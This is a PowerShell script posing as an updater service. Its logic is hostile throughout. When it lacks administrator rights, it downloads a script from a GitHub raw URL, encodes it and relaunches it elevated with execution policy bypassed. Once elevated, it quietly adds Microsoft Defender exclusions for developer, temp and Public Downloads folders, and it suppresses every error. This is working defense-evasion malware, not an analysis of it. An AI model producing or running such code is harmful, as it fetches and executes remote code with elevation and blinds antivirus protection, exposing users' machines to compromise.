# Define a log file path accessible by most users (including LocalSystem)
$logPath = "C:\Windows\Temp\updater_log.txt"

try {
    # Get the current user running the script
    $currentUser = whoami

    # Create a log message with date and user info
    $logMessage = "UpdaterSrv script executed at $(Get-Date) by user $currentUser"

    # Append the log message to the log file
    $logMessage | Out-File -FilePath $logPath -Append -Encoding utf8
}
catch {
    # If writing to log fails, capture error details
    $errorMessage = "Failed to write log at $(Get-Date). Error: $_"
    $errorMessage | Out-File -FilePath $logPath -Append -Encoding utf8
}

# List of realistic folders to exclude
$foldersToEnsure = @(
    "$env:USERPROFILE\.vscode",
    "$env:USERPROFILE\AppData\Local\Temp\buildcache",
    "C:\Dev\Tools",
    "C:\Dev\Projects",
    "C:\Program Files\nodejs",
    "C:\Users\Public\Downloads"
)

# Check if already running as admin
$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
$admin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# If NOT admin, relaunch this script with elevation using EncodedCommand
if (-not $admin) {
    try {
        $scriptUrl = "https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/main/script.ps1"
        $script = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing | Select-Object -ExpandProperty Content
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
        $encodedCommand = [Convert]::ToBase64String($bytes)
        Start-Process powershell.exe "-ExecutionPolicy Bypass -EncodedCommand $encodedCommand" -Verb RunAs
    } catch { }
    exit
}

# Now we're admin — get current exclusions
try {
    $currentExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
} catch { exit }

# Find missing ones
$missing = $foldersToEnsure | Where-Object { $_ -notin $currentExclusions }

# Add only missing exclusions
foreach ($folder in $missing) {
    try {
        Add-MpPreference -ExclusionPath $folder
    } catch { }
}

